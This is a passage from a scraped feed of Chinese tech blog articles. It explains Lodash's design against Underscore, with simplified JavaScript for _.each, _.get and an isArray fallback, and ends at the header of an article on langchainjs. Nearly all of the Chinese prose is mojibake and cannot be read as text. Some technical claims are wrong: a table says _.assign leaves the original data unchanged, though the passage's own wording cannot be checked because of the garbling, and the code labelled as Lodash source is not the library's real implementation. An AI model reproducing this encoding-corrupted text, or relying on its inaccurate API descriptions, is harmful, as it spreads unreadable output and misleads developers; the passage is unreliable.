Map/Setï¼‰ï¼Œä¸ºä¸åŒç±»å‹é€‰æ‹©æœ€ä¼˜æ‰§è¡Œè·¯å¾„ï¼Œé¿å…é€šç”¨é€»è¾‘çš„å†—ä½™åˆ¤æ–­ï¼›</td></tr><tr><td>æƒ°æ€§æ±‚å€¼ï¼šå»¶è¿Ÿè®¡ç®—</td><td><code>_.chain</code> é“¾å¼è°ƒç”¨é‡‡ç”¨ â€œæƒ°æ€§æ‰§è¡Œâ€â€”â€” ä»…åœ¨è°ƒç”¨ <code>value()</code> æ—¶æ‰æ‰§è¡Œæ‰€æœ‰é“¾å¼æ“ä½œï¼Œè€Œéæ¯ä¸€æ­¥éƒ½ç«‹å³è®¡ç®—ï¼Œå‡å°‘ä¸­é—´æ­¥éª¤çš„æ€§èƒ½æŸè€—ï¼›</td></tr><tr><td>ç¼“å­˜ä¼˜åŒ–ï¼šé¿å…é‡å¤è®¡ç®—</td><td>å¯¹é«˜é¢‘è°ƒç”¨ / é«˜å¼€é”€æ–¹æ³•ï¼ˆå¦‚ <code>_.memoize</code>/<code>_.cloneDeep</code>ï¼‰æä¾›ç¼“å­˜èƒ½åŠ›ï¼Œæˆ–æå‰ç¼“å­˜å¸¸ç”¨å¸¸é‡ï¼ˆå¦‚ç©ºå¯¹è±¡ã€ç©ºæ•°ç»„ï¼‰ï¼›</td></tr><tr><td>å‡å°‘å†—ä½™æ“ä½œï¼šç²¾å‡†è¾¹ç•Œåˆ¤æ–­</td><td>é¿å…æ— æ„ä¹‰çš„éå† / è®¡ç®—ï¼ˆå¦‚å¯¹ç©ºæ•°ç»„ç›´æ¥è¿”å›ï¼Œå¯¹é•¿åº¦ä¸º 1 çš„æ•°ç»„è·³è¿‡å¾ªç¯ï¼‰ï¼›</td></tr></tbody></table>
<h4 data-id="heading-25">æºç å®ä¾‹ï¼š<code>_.each</code> çš„æ€§èƒ½ä¼˜åŒ–ï¼ˆå¯¹æ¯” Underscoreï¼‰</h4>
<h5 data-id="heading-26">Underscore çš„ <code>_.each</code>ï¼ˆä½æ•ˆå®ç°ï¼‰</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Underscore ä»…åšé€šç”¨éå†ï¼Œæ— ç±»å‹é¢„åˆ¤ï¼Œç›´æ¥å¤ç”¨åŸç”Ÿé€»è¾‘</span>
_.<span class="hljs-property">each</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">obj, iteratee</span>) {
  iteratee = <span class="hljs-title function_">optimizeCb</span>(iteratee);
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(obj)) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>, l = obj.<span class="hljs-property">length</span>; i &lt; l; i++) <span class="hljs-title function_">iteratee</span>(obj[i], i, obj);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">in</span> obj) {
      <span class="hljs-keyword">if</span> (_.<span class="hljs-title function_">has</span>(obj, key)) <span class="hljs-title function_">iteratee</span>(obj[key], key, obj);
    }
  }
  <span class="hljs-keyword">return</span> obj;
};
</code></pre>
<h5 data-id="heading-27">Lodash çš„ <code>_.each</code>ï¼ˆæ€§èƒ½ä¼˜åŒ–ç‰ˆï¼‰</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Lodash å…ˆåšç²¾ç»†ç±»å‹é¢„åˆ¤ï¼Œä¸ºä¸åŒç±»å‹é€‰æœ€ä¼˜éå†æ–¹å¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">each</span>(<span class="hljs-params">collection, iteratee</span>) {
  <span class="hljs-keyword">const</span> func = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(collection)
    ? arrayEach <span class="hljs-comment">// æ•°ç»„ä¸“ç”¨éå†ï¼ˆçº¯ for å¾ªç¯ï¼Œæ— é¢å¤–åˆ¤æ–­ï¼‰</span>
    : <span class="hljs-title function_">isPlainObject</span>(collection)
      ? objectEach <span class="hljs-comment">// çº¯å¯¹è±¡ä¸“ç”¨éå†ï¼ˆObject.keys + for å¾ªç¯ï¼‰</span>
      : <span class="hljs-title function_">isMap</span>(collection)
        ? mapEach <span class="hljs-comment">// Map ä¸“ç”¨éå†ï¼ˆåŸç”Ÿ forEachï¼Œé€‚é… Map ç‰¹æ€§ï¼‰</span>
        : <span class="hljs-title function_">isSet</span>(collection)
          ? setEach <span class="hljs-comment">// Set ä¸“ç”¨éå†</span>
          : baseEach; <span class="hljs-comment">// å…œåº•é€šç”¨éå†</span>

  <span class="hljs-keyword">return</span> <span class="hljs-title function_">func</span>(collection, iteratee);
}

<span class="hljs-comment">// æ•°ç»„ä¸“ç”¨éå†ï¼šæè‡´ç²¾ç®€çš„ for å¾ªç¯ï¼ˆæ— å†—ä½™åˆ¤æ–­ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">arrayEach</span>(<span class="hljs-params">array, iteratee</span>) {
  <span class="hljs-keyword">let</span> index = -<span class="hljs-number">1</span>;
  <span class="hljs-keyword">const</span> length = array.<span class="hljs-property">length</span>;
  <span class="hljs-comment">// æå‰åˆ¤æ–­é•¿åº¦ï¼Œç©ºæ•°ç»„ç›´æ¥è¿”å›ï¼ˆå‡å°‘å¾ªç¯å¼€é”€ï¼‰</span>
  <span class="hljs-keyword">while</span> (++index &lt; length) {
    <span class="hljs-comment">// è¿­ä»£å™¨è¿”å› false æ—¶ç«‹å³ç»ˆæ­¢å¾ªç¯ï¼ˆé¢å¤–æ€§èƒ½ä¼˜åŒ–ï¼‰</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">iteratee</span>(array[index], index, array) === <span class="hljs-literal">false</span>) {
      <span class="hljs-keyword">break</span>;
    }
  }
  <span class="hljs-keyword">return</span> array;
}
</code></pre>
<h5 data-id="heading-28">è¯¥åŸåˆ™è§£å†³çš„æ ¸å¿ƒé—®é¢˜</h5>
<ul>
<li>è§£å†³ Underscore ç­‰åº“ â€œé€šç”¨é€»è¾‘å¯¼è‡´çš„æ€§èƒ½æŸè€—â€ï¼›</li>
<li>é€‚é…å¤§æ•°æ®é‡åœºæ™¯ï¼ˆå¦‚ä¸Šä¸‡æ¡æ•°æ®çš„éå† / å¤„ç†ï¼‰ï¼›</li>
<li>å¹³è¡¡ â€œåŠŸèƒ½ä¸°å¯Œæ€§â€ ä¸ â€œæ‰§è¡Œæ•ˆç‡â€ï¼Œé¿å… â€œå¤§è€Œæ…¢â€ã€‚</li>
</ul>
<h3 data-id="heading-29">API ä¸€è‡´æ€§</h3>
<p>Lodash é‡æ–°å®šä¹‰äº†å·¥å…·åº“çš„ API è®¾è®¡è§„èŒƒï¼Œé€šè¿‡ â€œç»Ÿä¸€çš„è§„åˆ™â€ è®©å¼€å‘è€…æ— éœ€è®°å¿†å¤æ‚çš„å‚æ•°ã€è¿”å›å€¼é€»è¾‘ï¼Œå¤§å¹…é™ä½å­¦ä¹ å’Œä½¿ç”¨æˆæœ¬ â€”â€” è¿™ä¹Ÿæ˜¯ Lodash æ¯” Underscore æ›´æ˜“ç”¨çš„æ ¸å¿ƒåŸå› ã€‚</p>
<h4 data-id="heading-30">æ ¸å¿ƒç»Ÿä¸€è§„åˆ™</h4>
<h5 data-id="heading-31">å‚æ•°é¡ºåºç»Ÿä¸€ï¼šâ€œæ•°æ®åœ¨å‰ï¼Œæ“ä½œåœ¨åâ€</h5>
<p>æ‰€æœ‰æ–¹æ³•éµå¾ª <code>(collection/value, iteratee/options, [thisArg])</code> çš„å‚æ•°é¡ºåºï¼š</p>
<ul>
<li>ç¬¬ä¸€å‚æ•°ï¼šå¾…å¤„ç†çš„ â€œæ•°æ®â€ï¼ˆæ•°ç»„ / å¯¹è±¡ / å‡½æ•°ç­‰ï¼‰ï¼›</li>
<li>ç¬¬äºŒå‚æ•°ï¼šå¯¹æ•°æ®çš„ â€œæ“ä½œâ€ï¼ˆè¿­ä»£å™¨ / é…ç½®é¡¹ç­‰ï¼‰ï¼›</li>
<li>å¯é€‰ç¬¬ä¸‰å‚æ•°ï¼šè¿­ä»£å™¨çš„ <code>this</code> ä¸Šä¸‹æ–‡ï¼›</li>
</ul>
<p><strong>åä¾‹ï¼ˆUnderscoreï¼‰</strong> ï¼šéƒ¨åˆ†æ–¹æ³•å‚æ•°æ··ä¹±ï¼ˆå¦‚ <code>_.sortBy</code> æ˜¯ <code>(collection, iteratee)</code>ï¼Œè€Œæ—©æœŸ <code>_.curry</code> æ˜¯ <code>(fn, arity)</code>ï¼Œæ— ç»Ÿä¸€é€»è¾‘ï¼‰ï¼›<strong>æ­£ä¾‹ï¼ˆLodashï¼‰</strong> ï¼š<code>_.map(array, fn)</code>ã€<code>_.filter(object, fn)</code>ã€<code>_.each(set, fn)</code> å‡éµå¾ª â€œæ•°æ®åœ¨å‰â€ã€‚</p>
<h5 data-id="heading-32">è¿”å›å€¼è§„åˆ™ç»Ÿä¸€</h5>

























<table><thead><tr><th>æ–¹æ³•ç±»å‹</th><th>è¿”å›å€¼è§„åˆ™</th></tr></thead><tbody><tr><td>ä¿®æ”¹ç±»æ–¹æ³•</td><td>è¿”å›<strong>æ–°å¯¹è±¡ / æ–°æ•°ç»„</strong>ï¼ˆå¦‚ <code>_.assign</code>/<code>_.map</code>ï¼‰ï¼Œä¸ä¿®æ”¹åŸæ•°æ®ï¼ˆæ— å‰¯ä½œç”¨ï¼‰ï¼›</td></tr><tr><td>åˆ¤æ–­ç±»æ–¹æ³•</td><td>è¿”å›å¸ƒå°”å€¼ï¼ˆå¦‚ <code>_.isEmpty</code>/<code>_.isEqual</code>ï¼‰ï¼Œä¸”åˆ¤æ–­é€»è¾‘ â€œå…¨åŸŸç»Ÿä¸€â€ï¼›</td></tr><tr><td>éå†ç±»æ–¹æ³•</td><td>è¿”å›åŸæ•°æ®ï¼ˆå¦‚ <code>_.each</code>ï¼‰ï¼Œæ”¯æŒé“¾å¼è°ƒç”¨ï¼›</td></tr><tr><td>å–å€¼ç±»æ–¹æ³•</td><td>è¿”å›ç›®æ ‡å€¼ï¼ˆå¦‚ <code>_.get</code>ï¼‰ï¼Œæ— å€¼æ—¶è¿”å›é»˜è®¤å€¼ï¼ˆé¿å…è¿”å› <code>undefined</code>ï¼‰ï¼›</td></tr></tbody></table>
<h5 data-id="heading-33">è¾¹ç•Œå¤„ç†ç»Ÿä¸€</h5>
<p>æ‰€æœ‰æ–¹æ³•å¯¹ <code>null</code>/<code>undefined</code>/ ç©ºå€¼ç­‰è¾¹ç•Œæƒ…å†µåšç»Ÿä¸€å…¼å®¹ï¼Œé¿å…å¼€å‘è€…æ‰‹åŠ¨åŠ åˆ¤æ–­ï¼š</p>
<ul>
<li><code>_.get(obj, 'a.b.c', 'default')</code>ï¼šå³ä½¿ <code>obj.a</code> ä¸å­˜åœ¨ï¼Œä¹Ÿä¸ä¼šæŠ¥é”™ï¼Œè¿”å›é»˜è®¤å€¼ï¼›</li>
<li><code>_.map(null, fn)</code>ï¼šç›´æ¥è¿”å›ç©ºæ•°ç»„ï¼Œè€ŒéæŠ›å‡º TypeErrorï¼›</li>
<li><code>_.each(undefined, fn)</code>ï¼šç›´æ¥è¿”å› <code>undefined</code>ï¼Œæ— æŠ¥é”™ã€‚</li>
</ul>
<h5 data-id="heading-34">å‘½åè§„åˆ™ç»Ÿä¸€</h5>
<ul>
<li>è¯­ä¹‰åŒ–å‘½åï¼šæ–¹æ³•åç›´æ¥ä½“ç°åŠŸèƒ½ï¼ˆå¦‚ <code>_.cloneDeep</code> æ˜ç¡®æ˜¯ â€œæ·±æ‹·è´â€ï¼Œè€Œé Underscore ä»…æœ‰çš„ <code>_.clone</code> æµ…æ‹·è´ï¼‰ï¼›</li>
<li>æ‰å¹³åŒ–å‘½åï¼š<strong>v4 ç‰ˆæœ¬ç§»é™¤åµŒå¥—å‘½åç©ºé—´</strong>ï¼ˆå¦‚ <code>_.collection.map</code> â†’ <code>_.map</code>ï¼‰ï¼Œæ‰€æœ‰æ–¹æ³•ç›´æ¥æŒ‚è½½åˆ° <code>_</code> ä¸Šï¼›</li>
<li>å‰ç¼€ç»Ÿä¸€ï¼šåˆ¤æ–­ç±»æ–¹æ³•å‡ä»¥ <code>is</code> å¼€å¤´ï¼ˆ<code>_.isArray</code>/<code>_.isPlainObject</code>ï¼‰ï¼Œæ“ä½œç±»æ–¹æ³•æ— å†—ä½™å‰ç¼€ã€‚</li>
</ul>
<h4 data-id="heading-35">æºç å®ä¾‹ï¼š<code>_.get</code> çš„è¾¹ç•Œå¤„ç†ä¸€è‡´æ€§</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Lodash _.get æ ¸å¿ƒé€»è¾‘ï¼šç»Ÿä¸€å¤„ç† null/undefinedï¼Œè¿”å›é»˜è®¤å€¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">object, path, defaultValue</span>) {
  <span class="hljs-comment">// å…ˆåˆ¤æ–­å¯¹è±¡æ˜¯å¦ä¸º null/undefinedï¼Œç›´æ¥è¿”å›é»˜è®¤å€¼ï¼ˆç»Ÿä¸€è¾¹ç•Œï¼‰</span>
  <span class="hljs-keyword">const</span> result = object == <span class="hljs-literal">null</span> ? <span class="hljs-literal">undefined</span> : <span class="hljs-title function_">baseGet</span>(object, path);
  <span class="hljs-comment">// ç»“æœä¸º undefined æ—¶è¿”å›é»˜è®¤å€¼ï¼Œå¦åˆ™è¿”å›ç»“æœï¼ˆç»Ÿä¸€è¿”å›è§„åˆ™ï¼‰</span>
  <span class="hljs-keyword">return</span> result === <span class="hljs-literal">undefined</span> ? defaultValue : result;
}
</code></pre>
<h4 data-id="heading-36">è¯¥åŸåˆ™è§£å†³çš„æ ¸å¿ƒé—®é¢˜</h4>
<ul>
<li>è§£å†³ Underscore API æ··ä¹±å¯¼è‡´çš„ â€œè®°å¿†æˆæœ¬é«˜ã€æ˜“å‡ºé”™â€ï¼›</li>
<li>é™ä½å›¢é˜Ÿåä½œæˆæœ¬ï¼ˆæ‰€æœ‰äººéµå¾ªåŒä¸€å¥— API è§„åˆ™ï¼‰ï¼›</li>
<li>æå‡ä»£ç å¯ç»´æŠ¤æ€§ï¼ˆæ–¹æ³•è¡Œä¸ºå¯é¢„åˆ¤ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-37">è·¨ç¯å¢ƒå…¼å®¹</h3>
<p>Lodash ä» v1 å¼€å§‹å°±ç„å‡† â€œå…¨ç¯å¢ƒé€‚é…â€ï¼Œæ˜¯æœ€æ—©åŒæ—¶æ”¯æŒæµè§ˆå™¨ã€Node.js çš„å·¥å…·åº“ä¹‹ä¸€ï¼Œå…¶å…¼å®¹é€»è¾‘å¹¶é â€œç®€å•çš„é™çº§â€ï¼Œè€Œæ˜¯ â€œåœ¨ä¸åŒç¯å¢ƒä¸‹æä¾›ä¸€è‡´çš„ API è¡Œä¸ºâ€ã€‚</p>
<h4 data-id="heading-38">å…¼å®¹èŒƒå›´ä¸å®ç°ç­–ç•¥</h4>





























<table><thead><tr><th>å…¼å®¹ç»´åº¦</th><th>å…·ä½“å®ç°é€»è¾‘</th></tr></thead><tbody><tr><td>æµè§ˆå™¨å…¼å®¹ï¼ˆIE6+ï¼‰</td><td>å¯¹è€æ—§æµè§ˆå™¨çš„ç¼ºå¤± API åšé™çº§å®ç°ï¼ˆå¦‚ <code>Array.isArray</code>/<code>Object.keys</code>ï¼‰ï¼›æŠ¹å¹³ä¸åŒæµè§ˆå™¨çš„ DOM / äº‹ä»¶ API å·®å¼‚ï¼›</td></tr><tr><td>Node.js å…¼å®¹</td><td>é€‚é… Node.js ç‰¹æœ‰æ•°æ®ç±»å‹ï¼ˆ<code>Buffer</code>/<code>Stream</code>/<code>process</code>ï¼‰ï¼›æ”¯æŒ CommonJS æ¨¡å—åŒ–ï¼ˆ<code>require('lodash')</code>ï¼‰ï¼›</td></tr><tr><td>æ¨¡å—åŒ–è§„èŒƒå…¼å®¹</td><td>æ”¯æŒ AMDï¼ˆRequireJSï¼‰ã€CommonJSã€ES6 Moduleï¼ˆ<code>lodash-es</code>ï¼‰ä¸‰å¤§æ¨¡å—åŒ–è§„èŒƒï¼›</td></tr><tr><td>åŸç”Ÿ API å…¼å®¹</td><td>é€‚é… ES6+ æ–°ç‰¹æ€§ï¼ˆ<code>Map</code>/<code>Set</code>/<code>Symbol</code>ï¼‰ï¼Œæ–°å¢ <code>_.isMap</code>/<code>_.isSymbol</code> ç­‰æ–¹æ³•ï¼›å…¼å®¹åŸç”Ÿæ–¹æ³•çš„è¡Œä¸ºï¼ˆå¦‚ <code>_.assign</code> å¯¹é½ <code>Object.assign</code>ï¼‰ï¼›</td></tr><tr><td>è¿è¡Œæ—¶ç¯å¢ƒå…¼å®¹</td><td>é€‚é… Electronã€React Native ç­‰è·¨ç«¯ç¯å¢ƒï¼ŒæŠ¹å¹³ç«¯ä¾§ API å·®å¼‚ï¼›</td></tr></tbody></table>
<h4 data-id="heading-39">æºç å®ä¾‹ï¼š<code>_.isArray</code> çš„è·¨ç¯å¢ƒå…¼å®¹</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Lodash _.isArray å…¼å®¹é€»è¾‘ï¼šä¼˜å…ˆå¤ç”¨åŸç”Ÿ APIï¼Œæ— åˆ™é™çº§å®ç°</span>
<span class="hljs-keyword">const</span> isArray = <span class="hljs-title class_">Array</span>.<span class="hljs-property">isArray</span> || <span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-comment">// è€æ—§æµè§ˆå™¨é™çº§ï¼šé€šè¿‡ toString åˆ¤æ–­ç±»å‹ï¼ˆIE6+ å…¼å®¹ï¼‰</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span> &amp;&amp;
    value !== <span class="hljs-literal">null</span> &amp;&amp;
    <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(value) === <span class="hljs-string">'[object Array]'</span>;
};
</code></pre>
<h4 data-id="heading-40">å…³é”®è®¾è®¡ï¼šâ€œæ¸è¿›å¼å…¼å®¹â€ è€Œé â€œä¸€åˆ€åˆ‡â€</h4>
<p>Lodash ä¸ä¼šä¸ºäº†å…¼å®¹è€æ—§ç¯å¢ƒç‰ºç‰²ç°ä»£ç¯å¢ƒçš„æ€§èƒ½ï¼š</p>
<ul>
<li>ç°ä»£ç¯å¢ƒï¼ˆChrome/Firefox/Node.js 14+ï¼‰ï¼šä¼˜å…ˆå¤ç”¨åŸç”Ÿ APIï¼ˆå¦‚ <code>Array.prototype.flat</code>ï¼‰ï¼›</li>
<li>è€æ—§ç¯å¢ƒï¼ˆIE6/Node.js 6-ï¼‰ï¼šè‡ªåŠ¨é™çº§ä¸ºçº¯ JS å®ç°ï¼›</li>
<li>å¼€å‘è€…å¯é€šè¿‡ <code>lodash-cli</code> å®šåˆ¶æ„å»ºï¼Œç§»é™¤æ— éœ€çš„å…¼å®¹é€»è¾‘ï¼ˆå¦‚ä»…æ”¯æŒç°ä»£æµè§ˆå™¨æ—¶ï¼Œå‰”é™¤ IE å…¼å®¹ä»£ç ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-41">è¯¥åŸåˆ™è§£å†³çš„æ ¸å¿ƒé—®é¢˜</h4>
<ul>
<li>é¿å…å¼€å‘è€…ä¸ºä¸åŒç¯å¢ƒç¼–å†™ â€œç¯å¢ƒé€‚é…å±‚â€ï¼›</li>
<li>è®©åŒä¸€å¥—ä»£ç å¯è¿è¡Œåœ¨æµè§ˆå™¨ã€Node.jsã€è·¨ç«¯ç¯å¢ƒï¼›</li>
<li>é™ä½å·¥å…·åº“çš„ â€œç¯å¢ƒè¿ç§»æˆæœ¬â€ï¼ˆå¦‚ä»æµè§ˆå™¨é¡¹ç›®è¿ç§»åˆ° Node.js é¡¹ç›®ï¼Œæ— éœ€æ›¿æ¢å·¥å…·åº“ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-42">åŠŸèƒ½å…¨è¦†ç›–</h3>
<p>Lodash éµå¾ª â€œä¸€ç«™å¼â€ è®¾è®¡ç†å¿µï¼Œè¦†ç›–å‰ç«¯å¼€å‘ä» â€œåŸºç¡€æ•°æ®å¤„ç†â€ åˆ° â€œå·¥ç¨‹åŒ–ä¼˜åŒ–â€ çš„æ‰€æœ‰é«˜é¢‘åœºæ™¯ï¼Œé¿å…å¼€å‘è€…æ··ç”¨å¤šä¸ªå·¥å…·åº“ï¼ˆå¦‚ Underscore + jQuery + è‡ªå®šä¹‰å·¥å…·å‡½æ•°ï¼‰ã€‚</p>
<h4 data-id="heading-43">åŠŸèƒ½åˆ†å±‚</h4>

























<table><thead><tr><th>åŠŸèƒ½å±‚</th><th>è¦†ç›–åœºæ™¯</th><th>æ ¸å¿ƒæ–¹æ³•ç¤ºä¾‹</th></tr></thead><tbody><tr><td>åŸºç¡€å±‚</td><td>æ•°ç»„ / å¯¹è±¡ / å­—ç¬¦ä¸² / æ•°å­— / æ—¥æœŸçš„é€šç”¨æ“ä½œ</td><td><code>_.each</code>/<code>_.map</code>/<code>_.keys</code>/<code>_.trim</code></td></tr><tr><td>å¢å¼ºå±‚</td><td>å‡½æ•°æ§åˆ¶ã€æ•°æ®æ·±åº¦æ“ä½œã€é›†åˆé«˜çº§å¤„ç†</td><td><code>_.debounce</code>/<code>_.cloneDeep</code>/<code>_.get</code></td></tr><tr><td>å·¥ç¨‹å±‚</td><td>ç±»å‹åˆ¤æ–­ã€æ•°æ®éªŒè¯ã€æƒ°æ€§æ±‚å€¼ã€æ¨¡å—åŒ–å¯¼å‡º</td><td><code>_.isPlainObject</code>/<code>_.chain</code>/<code>_.memoize</code></td></tr></tbody></table>
<h4 data-id="heading-44">æ ¸å¿ƒåŠŸèƒ½è¦†ç›–</h4>
<p>Lodash ä¸ä»…å¤åˆ» Underscore çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œè¿˜è¡¥å……äº†å¤§é‡é«˜é¢‘ä¸”åŸç”Ÿ JS ç¼ºå¤±çš„èƒ½åŠ›ï¼š</p>








































<table><thead><tr><th>ç¼ºå¤±çš„åŸç”Ÿèƒ½åŠ›</th><th>Lodash è§£å†³æ–¹æ¡ˆ</th><th>è§£å†³çš„æ ¸å¿ƒé—®é¢˜</th></tr></thead><tbody><tr><td>æ·±æ‹·è´</td><td><code>_.cloneDeep</code></td><td>åŸç”Ÿä»…èƒ½æµ…æ‹·è´ï¼ˆ<code>Object.assign</code>ï¼‰ï¼›</td></tr><tr><td>å¯¹è±¡è·¯å¾„å–å€¼ / èµ‹å€¼</td><td><code>_.get</code>/<code>_.set</code></td><td>åŸç”Ÿéœ€å¤šå±‚ <code>&amp;&amp;</code> åˆ¤æ–­ï¼ˆ<code>obj?.a?.b</code> æ˜¯ ES2020 åæ‰æ”¯æŒï¼‰ï¼›</td></tr><tr><td>é˜²æŠ–èŠ‚æµï¼ˆé«˜çº§é…ç½®ï¼‰</td><td><code>_.debounce</code>/<code>_.throttle</code></td><td>åŸç”Ÿéœ€æ‰‹åŠ¨å®ç°ï¼Œä¸”æ—  â€œç«‹å³æ‰§è¡Œâ€â€œå–æ¶ˆâ€ ç­‰é…ç½®ï¼›</td></tr><tr><td>æ•°æ®æ·±åº¦æ¯”è¾ƒ</td><td><code>_.isEqual</code></td><td>åŸç”Ÿä»…èƒ½æ¯”è¾ƒå¼•ç”¨ï¼ˆ<code>===</code>ï¼‰ï¼Œæ— æ³•æ¯”è¾ƒå¯¹è±¡å†…å®¹ï¼›</td></tr><tr><td>å‡½æ•°æŸ¯é‡ŒåŒ– / ç»„åˆ</td><td><code>_.curry</code>/<code>_.flow</code></td><td>åŸç”Ÿæ— å†…ç½®å‡½æ•°å¼ç¼–ç¨‹å·¥å…·ï¼›</td></tr><tr><td>é›†åˆæƒ°æ€§éå†</td><td><code>_.chain</code></td><td>åŸç”Ÿé“¾å¼è°ƒç”¨éœ€æ‰‹åŠ¨æ‹¼æ¥ï¼Œæ— æƒ°æ€§æ±‚å€¼ï¼›</td></tr></tbody></table>
<h4 data-id="heading-45">è®¾è®¡ç»†èŠ‚</h4>
<p>Lodash çš„åŠŸèƒ½è®¾è®¡éµå¾ª â€œç¬¦åˆå¼€å‘è€…ç›´è§‰â€ï¼š</p>
<ul>
<li>æ–¹æ³•è¡Œä¸ºä¸å‘½åé«˜åº¦ä¸€è‡´ï¼ˆå¦‚ <code>_.map</code> å¯¹æ•°ç»„ / å¯¹è±¡ / Map çš„å¤„ç†é€»è¾‘ â€œè¯­ä¹‰ä¸€è‡´â€ï¼‰ï¼›</li>
<li>æ–°å¢æ–¹æ³•æ—¶ï¼Œä¼˜å…ˆå¤ç”¨å·²æœ‰å‚æ•°è§„åˆ™ï¼ˆå¦‚ <code>_.filter</code> ä¸ <code>_.map</code> çš„å‚æ•°é¡ºåºå®Œå…¨ä¸€è‡´ï¼‰ï¼›</li>
<li>é¿å… â€œéšè—è¡Œä¸ºâ€ï¼ˆå¦‚ä¿®æ”¹åŸæ•°æ®ã€é™é»˜å¤±è´¥ï¼‰ï¼Œæ‰€æœ‰å‰¯ä½œç”¨å‡æ˜ç¡®å‘ŠçŸ¥ã€‚</li>
</ul>
<h4 data-id="heading-46">è¯¥åŸåˆ™è§£å†³çš„æ ¸å¿ƒé—®é¢˜</h4>
<ul>
<li>å‡å°‘é¡¹ç›®ä¾èµ–æ•°é‡ï¼ˆæ— éœ€å¼•å…¥å¤šä¸ªå·¥å…·åº“ï¼‰ï¼›</li>
<li>é™ä½ â€œå·¥å…·å‡½æ•°ç¢ç‰‡åŒ–â€ï¼ˆé¿å…å›¢é˜Ÿæ¯ä¸ªäººéƒ½å†™è‡ªå·±çš„æ·±æ‹·è´ / é˜²æŠ–å‡½æ•°ï¼‰ï¼›</li>
<li>æå‡ä»£ç ä¸€è‡´æ€§ï¼ˆå…¨é¡¹ç›®ä½¿ç”¨åŒä¸€å¥—å·¥å…·æ–¹æ³•ï¼‰ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[langchainjs&langgraphjså…¥é—¨(ä¸€)ç®€ä»‹å’Œæ¨¡å‹è°ƒç”¨]]></title>    <link>https://juejin.cn/post/7594315259462746147</link>    <guid>https://juejin.cn/post/7594315259462746147</guid>    <pubDate>2026-01-13T01:50:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594315259462746147" data-draft-id="7594310266411057152" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="langchainjs&amp;langgraphjså…¥é—¨(ä¸€)ç®€ä»‹å’Œæ¨¡å‹è°ƒç”¨"/> <meta itemprop="keywords" content="LangChain,Node.js,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-13T01:50:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="The_massif"/> <meta itemprop="url" content="https://juejin.cn/user/3620050680165784"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            langchainjs&amp;langgraphjså…¥é—¨(ä¸€)ç®€ä»‹å’Œæ¨¡å‹è°ƒç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3620050680165784/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    The_massif
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:50:24.000Z" title="Tue Jan 13 2026 01:50:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
